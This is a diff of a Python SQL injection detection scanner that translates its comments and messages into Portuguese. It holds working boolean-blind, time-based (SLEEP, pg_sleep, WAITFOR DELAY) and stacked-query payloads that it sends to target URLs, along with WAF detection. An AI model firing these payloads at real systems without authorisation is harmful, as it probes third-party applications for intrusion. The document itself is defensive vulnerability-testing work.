+        Envia pares booleanos true/false e detecta diferenças estatisticamente significativas.
 
-        [NEW-4] Dual-metric false-positive reduction:
-          Both conditions must hold to declare vulnerable:
-          (a) median body-length differential > 15% of baseline
-          (b) median content-similarity differential > 0.05 (5 percentage points)
-          This prevents false positives on pages with natural size fluctuations
-          where length changes but content structure stays the same.
+        [NEW-4] Redução de falsos positivos dual-metric:
+          Ambas as condições devem valer para declarar vulnerável:
+          (a) diferencial mediano de tamanho do corpo > 15% do baseline
+          (b) diferencial mediano de similaridade de conteúdo > 0,05 (5 pontos percentuais)
+          Isto evita falsos positivos em páginas com flutuações naturais de tamanho
+          onde o comprimento muda mas a estrutura do conteúdo permanece a mesma.
 
-        [NEW-5] Expanded from 4 to 8 payload pairs including DB-specific
-          variants and comment-terminated forms.
+        [NEW-5] Expandido de 4 para 8 pares de payloads incluindo variantes
+          específicas de DB e formas terminadas com comentário.
         """
         result = {
             "method":     "boolean_blind",
@@ -1146,27 +1146,27 @@ class SQLiDetector:
             "evidence":   [],
         }
 
-        # [NEW-5] + [FP-3] Boolean payload pairs.
-        # The original "OR 1=1 / OR 1=2" pair has been REMOVED: OR-based
-        # payloads can legitimately expand the result set (returning more DB
-        # rows) without any injection, producing length changes that are
-        # indistinguishable from real SQLi signals.
-        # Replacements use arithmetic-only conditions that evaluate in the
-        # WHERE clause without adding rows: AND (1)=(1) vs AND (1)=(2), and
-        # a CASE WHEN variant for backends that fold simple arithmetic.
+        # [NEW-5] + [FP-3] Pares de payloads booleanos.
+        # O par original "OR 1=1 / OR 1=2" foi REMOVIDO: payloads baseados em OR
+        # podem expandir legitimamente o conjunto de resultados (retornando mais
+        # linhas do DB) sem nenhuma injeção, produzindo mudanças de tamanho
+        # indistinguíveis de sinais reais de SQLi.
+        # Os substitutos usam condições apenas aritméticas que avaliam na
+        # cláusula WHERE sem adicionar linhas: AND (1)=(1) vs AND (1)=(2), e
+        # uma variante CASE WHEN para backends que dobram aritmética simples.
         bool_payloads = [
-            # Standard string-context pairs
+            # Pares em contexto de string padrão
             ("1' AND '1'='1",          "true"),
             ("1' AND '1'='2",          "false"),
-            # Numeric context
+            # Contexto numérico
             ("1 AND 1=1",              "true"),
             ("1 AND 1=2",              "false"),
-            # Comment-terminated variants (handles parsers that need -- to close)
+            # Variantes terminadas com comentário (lida com parsers que precisam de -- para fechar)
             ("1' AND 1=1--",           "true"),
             ("1' AND 1=2--",           "false"),
-            # [FP-3] Parenthesized arithmetic — no row-set expansion, safe replacement
-            # for the removed OR pair; CASE WHEN handles backends that optimize away
-            # simple integer comparisons
+            # [FP-3] Aritmética com parênteses — sem expansão de conjunto de linhas,
+            # substituto seguro do par OR removido; CASE WHEN lida com backends que
+            # otimizam comparações inteiras simples
             ("1 AND (1)=(1)",          "true"),
             ("1 AND (1)=(2)",          "false"),
             ("1 AND CASE WHEN 1=1 THEN 1 ELSE 0 END=1", "true"),
@@ -1194,7 +1194,7 @@ class SQLiDetector:
                 r = self._get(test_url)
                 if r is not None:
                     sample_lengths.append(len(r.text))
-                    # [NEW-4] Also compute similarity ratio (sampled)
+                    # [NEW-4] Também calcula a razão de similaridade (amostrada)
                     b1  = baseline_content[: _PROBE_SAMPLE_BYTES]
                     b2  = r.text[: _PROBE_SAMPLE_BYTES]
                     sim = difflib.SequenceMatcher(None, b1, b2).ratio()
@@ -1220,33 +1220,33 @@ class SQLiDetector:
         median_false_len  = statistics.median(false_lengths)
         len_diff          = abs(median_true_len - median_false_len)
 
-        # [NEW-4] Similarity differential
+        # [NEW-4] Diferencial de similaridade
         median_true_sim   = statistics.median(true_sims)  if true_sims  else 1.0
         median_false_sim  = statistics.median(false_sims) if false_sims else 1.0
         sim_diff          = abs(median_true_sim - median_false_sim)
 
-        # Noise ceiling from internal variance
+        # Teto de ruído a partir da variância interna
         all_true   = true_lengths
         all_false  = false_lengths
         iv_true    = max(all_true)  - min(all_true)
         iv_false   = max(all_false) - min(all_false)
         noise_ceil = baseline_len * 0.04
 
-        # [NEW-4] Both metrics must exceed thresholds
+        # [NEW-4] Ambas as métricas devem exceder os limiares
         len_condition = (
             len_diff > baseline_len * 0.15
             and iv_true  < noise_ceil
             and iv_false < noise_ceil
         )
-        sim_condition = sim_diff > 0.05  # 5 percentage points
+        sim_condition = sim_diff > 0.05  # 5 pontos percentuais
 
         if len_condition and sim_condition:
-            # ── [FP-4] Triple-confirmation ────────────────────────────────────
-            # Re-send the first valid true/false pair two more times and check
-            # that the signal is reproducible. A single network fluctuation or
-            # CDN cache miss can produce a one-off length change that passes
-            # dual-metric. Two consistent rounds = confirmed; any inconsistency
-            # = downgrade to LOW.
+            # ── [FP-4] Tripla confirmação ────────────────────────────────────
+            # Reenvia o primeiro par true/false válido mais duas vezes e verifica
+            # se o sinal é reprodutível. Uma única flutuação de rede ou cache miss
+            # de CDN pode produzir uma mudança de tamanho isolada que passa no
+            # dual-metric. Duas rodadas consistentes = confirmado; qualquer inconsistência
+            # = rebaixar para LOW.
             confirm_ok = True
             first_true_payload  = next(
                 (p for p, t in bool_payloads if t == "true"), "1 AND 1=1"
@@ -1286,49 +1286,50 @@ class SQLiDetector:
                         f"iv_t={iv_true:.0f}B  iv_f={iv_false:.0f}B"
                     )
                 else:
-                    # Triple-confirm failed → downgrade
+                    # Tripla confirmação falhou → rebaixar
                     result["vulnerable"] = True
                     result["confidence"] = SQLiConfidence.LOW.value
                     result["evidence"].append(
-                        f"Boolean dual-metric PASSED but triple-confirm FAILED "
-                        f"(confirm_Δ={confirm_len_diff:.0f}B < 10% baseline) — "
-                        f"downgraded to LOW; likely dynamic-page FP"
+                        f"Boolean dual-metric PASSOU mas tripla confirmação FALHOU "
+                        f"(confirm_Δ={confirm_len_diff:.0f}B < 10% do baseline) — "
+                        f"rebaixado para LOW; provável FP de página dinâmica"
                     )
             else:
                 result["vulnerable"] = True
                 result["confidence"] = SQLiConfidence.LOW.value
                 result["evidence"].append(
-                    "Boolean dual-metric passed; triple-confirm inconclusive "
-                    "(network error during re-check) — LOW confidence"
+                    "Boolean dual-metric passou; tripla confirmação inconclusiva "
+                    "(erro de rede no re-check) — confiança LOW"
                 )
 
         elif len_condition:
-            # Length passed but similarity did not — LOW confidence only
+            # Tamanho passou mas similaridade não — apenas confiança LOW
             result["vulnerable"] = True
             result["confidence"] = SQLiConfidence.LOW.value
             result["evidence"].append(
-                f"Boolean length differential only (sim_diff={sim_diff:.3f} "
-                f"below threshold): "
-                f"Δlen={len_diff:.0f}B — treat as LOW confidence"
+                f"Somente diferencial de tamanho boolean (sim_diff={sim_diff:.3f} "
+                f"abaixo do limiar): "
+                f"Δlen={len_diff:.0f}B — trate como confiança LOW"
             )
 
         return result
 
     # ──────────────────────────────────────────────────────────
-    #  [4] Time-based blind — [NEW-3] DB-specific payloads
+    #  [4] Time-based blind — [NEW-3] payloads específicos por DB
     # ──────────────────────────────────────────────────────────
 
     def _test_time_based_blind(self, url: str, param_name: str) -> Dict:
         """
-        Inject SLEEP payloads and detect delays as time-based blind SQLi.
+        Injeta payloads SLEEP e detecta delays como SQLi time-based blind.
 
-        [NEW-3] DB-specific payload set instead of MySQL-only:
+        [NEW-3] Conjunto de payloads específico por DB em vez de só MySQL:
           - MySQL/MariaDB: SLEEP()
           - PostgreSQL:    pg_sleep()
           - MSSQL:         WAITFOR DELAY
-          - Oracle:        heavy UTL_HTTP / dbms_pipe query (no native sleep)
-          - SQLite:        heavy cross-join query
-        Each group is tried independently; the first confirmed hit returns.
+          - Oracle:        query pesada UTL_HTTP / dbms_pipe (sem sleep nativo)
+          - SQLite:        query pesada de cross-join
+
+        Cada grupo é tentado de forma independente; o primeiro hit confirmado retorna.
         """
         result = {
             "method":     "time_based_blind",
@@ -1340,14 +1341,14 @@ class SQLiDetector:
         baseline = self._measure_baseline_latency(url)
         if baseline is None:
             result["evidence"].append(
-                "Skipped: host unreachable or baseline latency too high"
+                "Pulado: host inalcançável ou latência do baseline alta demais"
             )
             return result
 
         threshold  = baseline + _SLEEP_DELAY + _TIMEBASED_MARGIN
         extra_read = _SLEEP_DELAY + _TIMEBASED_MARGIN + 3
 
-        # [NEW-3] DB-specific sleep payloads
+        # [NEW-3] Payloads de sleep específicos por DB
         sleep_payloads_groups = [
             # MySQL / MariaDB
             [
@@ -1367,12 +1368,12 @@ class SQLiDetector:
                 f"1 WAITFOR DELAY '0:0:{_SLEEP_DELAY}'--",
                 f"1' OR 1=1; WAITFOR DELAY '0:0:{_SLEEP_DELAY}'--",
             ],
-            # Oracle — no native sleep; use heavy recursive query as fallback
+            # Oracle — sem sleep nativo; usa query recursiva pesada como fallback
             [
                 "1' AND 1=(SELECT COUNT(*) FROM ALL_OBJECTS,ALL_OBJECTS,ALL_OBJECTS "
                 "WHERE ROWNUM<10)--",
             ],
-            # SQLite — heavy cross join
+            # SQLite — cross join pesado
             [
                 "1 AND (SELECT COUNT(*) FROM "
                 "sqlite_master,sqlite_master,sqlite_master) AND 1=1",
@@ -1407,12 +1408,12 @@ class SQLiDetector:
                     waf = self._detect_waf(response)
                     if waf:
                         result["evidence"].append(
-                            f"WAF detected ({waf}): time-based latency may be "
-                            f"firewall delay"
+                            f"WAF detectado ({waf}): latência time-based pode ser "
+                            f"delay do firewall"
                         )
                         continue
 
-                # Confirm with neutral requests
+                # Confirma com requests neutros
                 neutral_url    = self._inject_payload(url, param_name, neutral_payload)
                 confirm_times: List[float] = []
                 confirm_fails  = 0
@@ -1438,11 +1439,11 @@ class SQLiDetector:
                 confirm_threshold = baseline + _TIMEBASED_MARGIN
 
                 if confirm_avg <= confirm_threshold:
-                    # ── [FP-5] Double-SLEEP confirmation ─────────────────────
-                    # Re-send the sleep payload ONE more time. A single network
-                    # spike can delay a response without any SQLi. If the second
-                    # hit also exceeds the threshold → HIGH confidence.
-                    # If not → discard the finding (spike eliminated as FP).
+                    # ── [FP-5] Confirmação dupla de SLEEP ─────────────────────
+                    # Reenvia o payload de sleep MAIS uma vez. Um único pico de rede
+                    # pode atrasar uma resposta sem nenhum SQLi. Se o segundo
+                    # hit também exceder o limiar → confiança HIGH.
+                    # Se não → descarta o finding (pico eliminado como FP).
                     t_recheck  = time.monotonic()
                     r_recheck  = self._get(test_url, extra_read=extra_read)
                     el_recheck = time.monotonic() - t_recheck
@@ -1454,16 +1455,16 @@ class SQLiDetector:
 
                     if not recheck_triggered:
                         result["evidence"].append(
-                            f"[FP-guard] Time-based: first hit elapsed={elapsed:.1f}s "
-                            f"confirmed neutral but SLEEP re-check did NOT trigger "
-                            f"(recheck={el_recheck:.1f}s) — discarded as network spike"
+                            f"[FP-guard] Time-based: primeiro hit elapsed={elapsed:.1f}s "
+                            f"neutro confirmado mas re-check do SLEEP NÃO disparou "
+                            f"(recheck={el_recheck:.1f}s) — descartado como pico de rede"
                         )
-                        continue   # don't declare vulnerable
+                        continue   # não declarar vulnerável
 
                     result["vulnerable"] = True
                     result["confidence"] = SQLiConfidence.HIGH.value
                     result["evidence"].append(
-                        f"Time-based double-confirmed: "
+                        f"Time-based duplamente confirmado: "
                         f"payload=[{sleep_payload[:50]}]  "
                         f"hit1={elapsed:.1f}s  hit2={el_recheck:.1f}s  "
                         f"threshold={threshold:.1f}s  "
@@ -1480,17 +1481,17 @@ class SQLiDetector:
     def _test_stacked_query(self, url: str, param_name: str,
                              baseline_content: str) -> Dict:
         """
-        Lightweight probe for stacked-query (multiple statements) support.
+        Probe leve para suporte a stacked-query (múltiplas declarações).
 
-        [NEW-6] Sends ";" separator payloads that insert a harmless second
-        statement (SELECT NULL / SELECT 1). Detects:
-          - SQL error signatures in the response (confirms stacking)
-          - Significant response-content change vs baseline (state change)
-          - Status-code anomalies (some servers error on stacked queries)
+        [NEW-6] Envia payloads separadores ";" que inserem uma segunda declaração
+        inofensiva (SELECT NULL / SELECT 1). Detecta:
+          - Assinaturas de erro SQL na resposta (confirma stacking)
+          - Mudança significativa de conteúdo da resposta vs baseline (mudança de estado)
+          - Anomalias de status-code (alguns servidores erram em stacked queries)
 
-        Confidence is capped at LOW because stacked-query support alone does
-        not confirm exploitability — it signals that further manual testing
-        is warranted.
+        A confiança é limitada a LOW porque o suporte a stacked-query sozinho não
+        confirma explorabilidade — sinaliza que mais testes manuais
+        são recomendados.
         """
         result = {
             "method":     "stacked_query",
@@ -1503,8 +1504,8 @@ class SQLiDetector:
             "1'; SELECT NULL--",
             "1'; SELECT NULL#",
             "1'; SELECT 1--",
-            "1'; WAITFOR DELAY '0:0:0'--",   # MSSQL — zero delay, just stacking test
-            "1'; SELECT pg_sleep(0)--",       # PostgreSQL — zero delay
+            "1'; WAITFOR DELAY '0:0:0'--",   # MSSQL — delay zero, apenas teste de stacking
+            "1'; SELECT pg_sleep(0)--",       # PostgreSQL — delay zero
             "1'; SELECT NULL FROM dual--",    # Oracle
             "1'; SELECT NULL FROM sqlite_master--",  # SQLite
         ]
@@ -1523,23 +1524,23 @@ class SQLiDetector:
             waf = self._detect_waf(response)
             if waf:
                 result["evidence"].append(
-                    f"WAF detected ({waf}): stacked probe blocked"
+                    f"WAF detectado ({waf}): probe stacked bloqueado"
                 )
                 break
 
-            # Signal 1 — SQL error signature
+            # Sinal 1 — assinatura de erro SQL
             match = self._match_sql_errors(response.text)
             if match:
                 db_type, pattern = match
                 result["vulnerable"] = True
                 result["confidence"] = SQLiConfidence.LOW.value
                 result["evidence"].append(
-                    f"Stacked query triggered {db_type.upper()} error: "
+                    f"Stacked query disparou erro {db_type.upper()}: "
                     f"{pattern[:60]} — payload: {payload[:50]}"
                 )
                 return result
 
-            # Signal 2 — significant content change vs baseline
+            # Sinal 2 — mudança significativa de conteúdo vs baseline
             b1  = baseline_content[: _PROBE_SAMPLE_BYTES]
             b2  = response.text[: _PROBE_SAMPLE_BYTES]
             sim = difflib.SequenceMatcher(None, b1, b2).ratio()
@@ -1547,8 +1548,8 @@ class SQLiDetector:
                 result["vulnerable"] = True
                 result["confidence"] = SQLiConfidence.LOW.value
                 result["evidence"].append(
-                    f"Stacked query caused significant content change "
-                    f"(similarity={sim:.2f}): payload: {payload[:50]}"
+                    f"Stacked query causou mudança significativa de conteúdo "
+                    f"(similaridade={sim:.2f}): payload: {payload[:50]}"
                 )
                 return result
 
@@ -1558,11 +1559,11 @@ class SQLiDetector:
         return result
 
     # ──────────────────────────────────────────────────────────
-    #  Main GET entry point
+    #  Entry point principal GET
     # ──────────────────────────────────────────────────────────
 
     def test_sqli(self, url: str) -> Dict:
-        """Run the full GET-parameter SQLi test suite on url."""
+        """Roda a suíte completa de testes SQLi de parâmetros GET na url."""
         result = {
             "url":                url,
             "vulnerable":         False,
@@ -1574,22 +1575,22 @@ class SQLiDetector:
         }
 
         if not self.has_query_params(url):
-            result["message"] = "No query parameters found"
+            result["message"] = "Nenhum parâmetro de consulta encontrado"
             return result
 
         if self.circuit_breaker.is_dead(url):
-            result["message"] = "Host unreachable (circuit breaker open)"
+            result["message"] = "Host inalcançável (circuit breaker aberto)"
             return result
 
         result["tested"] = True
         params = self._extract_query_params(url)
         if not params:
-            result["message"] = "No query parameters found"
+            result["message"] = "Nenhum parâmetro de consulta encontrado"
             return result
 
         baseline = self._get_baseline_response(url)
         if baseline is None:
-            result["message"] = "Could not establish baseline (host unreachable)"
+            result["message"] = "Não foi possível estabelecer baseline (host inalcançável)"
             return result
 
         baseline_status, baseline_content, baseline_len = baseline
@@ -1600,23 +1601,23 @@ class SQLiDetector:
             if waf_on_baseline:
                 result["waf_detected"] = waf_on_baseline
                 result["message"] = (
-                    f"WAF detected ({waf_on_baseline}) on baseline — "
-                    f"results may have false negatives"
+                    f"WAF detectado ({waf_on_baseline}) no baseline — "
+                    f"resultados podem ter falsos negativos"
                 )
 
         per_param_scores: List[int] = []
 
-        # ── [FP-1] Page-stability pre-check ──────────────────────────────────
-        # Measure how stable the page is between two clean requests.
-        # Boolean-blind is skipped per-param if stability < _PAGE_STABILITY_MIN
-        # because dynamic content (ads, rotating feeds, timestamps) produces
-        # natural length/similarity changes that perfectly mimic blind SQLi.
+        # ── [FP-1] Pre-check de estabilidade da página ──────────────────────
+        # Mede o quão estável a página é entre duas requests limpas.
+        # Boolean-blind é pulado por parâmetro se estabilidade < _PAGE_STABILITY_MIN
+        # porque conteúdo dinâmico (anúncios, feeds rotativos, timestamps) produz
+        # mudanças naturais de tamanho/similaridade que imitam perfeitamente SQLi blind.
         _page_stability = self._check_page_stability(url)
         _boolean_allowed = _page_stability >= _PAGE_STABILITY_MIN
 
         for param_name in self._prioritize_params(params):
             if self.circuit_breaker.is_dead(url):
-                result["message"] = "Host became unreachable during testing"
+                result["message"] = "Host ficou inalcançável durante o teste"
                 break
             if _exit_requested or _skip_current:
                 break
@@ -1638,7 +1639,7 @@ class SQLiDetector:
                     param_score += 3
                     result["vulnerable"]         = True
                     result["overall_confidence"] = SQLiConfidence.HIGH.value
-                    result["message"]            = f"Tested {len(params)} parameter(s)"
+                    result["message"]            = f"Testados {len(params)} parâmetro(s)"
                     return result
                 else:
                     param_score += 2
@@ -1660,10 +1661,10 @@ class SQLiDetector:
                     param_score += 1
 
             # ── Boolean blind ─────────────────────────────────────────────────
-            # [FP-1] Skip boolean blind on dynamically unstable pages to avoid
-            # false positives from natural page variation.
+            # [FP-1] Pula boolean blind em páginas dinamicamente instáveis para evitar
+            # falsos positivos de variação natural da página.
             if _boolean_allowed:
-                # [NEW-4] Pass baseline_content for similarity-ratio metric
+                # [NEW-4] Passa baseline_content para a métrica de razão de similaridade
                 bool_result = self._test_boolean_blind(
                     url, param_name, baseline_len, baseline_content
                 )
@@ -1673,9 +1674,9 @@ class SQLiDetector:
                     "vulnerable": False,
                     "confidence": SQLiConfidence.NONE.value,
                     "evidence":   [
-                        f"[FP-guard] Boolean blind skipped — page stability "
-                        f"{_page_stability:.2f} < threshold {_PAGE_STABILITY_MIN} "
-                        f"(dynamic content would cause false positives)"
+                        f"[FP-guard] Boolean blind pulado — estabilidade da página "
+                        f"{_page_stability:.2f} < limiar {_PAGE_STABILITY_MIN} "
+                        f"(conteúdo dinâmico causaria falsos positivos)"
                     ],
                 }
             bool_result["parameter"] = param_name
@@ -1700,7 +1701,7 @@ class SQLiDetector:
             stacked_result["parameter"] = param_name
             result["tests"].append(stacked_result)
             if stacked_result["vulnerable"]:
-                param_score += 1  # LOW confidence signal only
+                param_score += 1  # apenas sinal de confiança LOW
 
             if param_score > 0:
                 per_param_scores.append(param_score)
@@ -1723,21 +1724,21 @@ class SQLiDetector:
             else:
                 result["overall_confidence"] = SQLiConfidence.LOW.value
 
-        result["message"] = f"Tested {len(params)} parameter(s)"
+        result["message"] = f"Testados {len(params)} parâmetro(s)"
         return result
 
     # ──────────────────────────────────────────────────────────
-    #  POST entry point — [NEW-9] multi-method
+    #  Entry point POST — [NEW-9] multi-método
     # ──────────────────────────────────────────────────────────
 
     def test_post_sqli(self, url: str, post_data: Dict[str, str]) -> Dict:
         """
-        Test POST parameters for SQL injection.
+        Testa parâmetros POST para SQL injection.
 
-        [NEW-9] Promoted from error-only to error + time-based, matching
-        the GET-parameter coverage. Boolean/union not included here because
-        POST semantics (non-idempotent, possible side effects) make repeated
-        differential requests inadvisable without explicit authorisation.
+        [NEW-9] Promovido de error-only para error + time-based, igualando
+        a cobertura de parâmetros GET. Boolean/union não incluídos aqui porque
+        a semântica de POST (não idempotente, possíveis efeitos colaterais) torna
+        requests diferenciais repetidas desaconselháveis sem autorização explícita.
         """
         result = {
             "url":                url,
@@ -1749,13 +1750,13 @@ class SQLiDetector:
             "waf_detected":       None,
         }
         if not post_data or self.circuit_breaker.is_dead(url):
-            result["message"] = "No POST parameters or host unreachable"
+            result["message"] = "Sem parâmetros POST ou host inalcançável"
             return result
 
         result["tested"]  = True
         baseline_resp     = self._get(url)
         if baseline_resp is None:
-            result["message"] = "Could not establish baseline"
+            result["message"] = "Não foi possível estabelecer baseline"
             return result
 
         waf = self._detect_waf(baseline_resp)
@@ -1852,18 +1853,18 @@ class SQLiDetector:
             )
             result["vulnerable"] = True
 
-        result["message"] = f"Tested {len(post_data)} POST parameter(s)"
+        result["message"] = f"Testados {len(post_data)} parâmetro(s) POST"
         return result
 
     # ──────────────────────────────────────────────────────────
-    #  JSON entry point — [NEW-9] multi-method
+    #  Entry point JSON — [NEW-9] multi-método
     # ──────────────────────────────────────────────────────────
 
     def test_json_sqli(self, url: str, json_data: Dict[str, str]) -> Dict:
         """
-        Test JSON body parameters for SQL injection.
+        Testa parâmetros do corpo JSON para SQL injection.
 
-        [NEW-9] Promoted from error-only to error + time-based.
+        [NEW-9] Promovido de error-only para error + time-based.
         """
         result = {
             "url":                url,
@@ -1875,7 +1876,7 @@ class SQLiDetector:
             "waf_detected":       None,
         }
         if not json_data or self.circuit_breaker.is_dead(url):
-            result["message"] = "No JSON parameters or host unreachable"
+            result["message"] = "Sem parâmetros JSON ou host inalcançável"
             return result
 
         result["tested"]  = True
@@ -1966,15 +1967,15 @@ class SQLiDetector:
             )
             result["vulnerable"] = True
 
-        result["message"] = "JSON injection test completed"
+        result["message"] = "Teste de injeção JSON concluído"
         return result
 
     # ──────────────────────────────────────────────────────────
-    #  Path-based entry point
+    #  Entry point baseado em path
     # ──────────────────────────────────────────────────────────
 
     def test_path_based_sqli(self, url: str) -> Dict:
-        """Test path-based SQLi by appending a quote to numeric/word path segments."""
+        """Testa SQLi path-based anexando uma aspa a segmentos de path numéricos/palavra."""
         result = {
             "method":     "path_based",
             "vulnerable": False,
@@ -1990,7 +1991,7 @@ class SQLiDetector:
             if response:
                 waf = self._detect_waf(response)
                 if waf:
-                    result["evidence"].append(f"WAF detected ({waf}): path-based skipped")
+                    result["evidence"].append(f"WAF detectado ({waf}): path-based pulado")
                     return result
 
                 match = self._match_sql_errors(response.text)
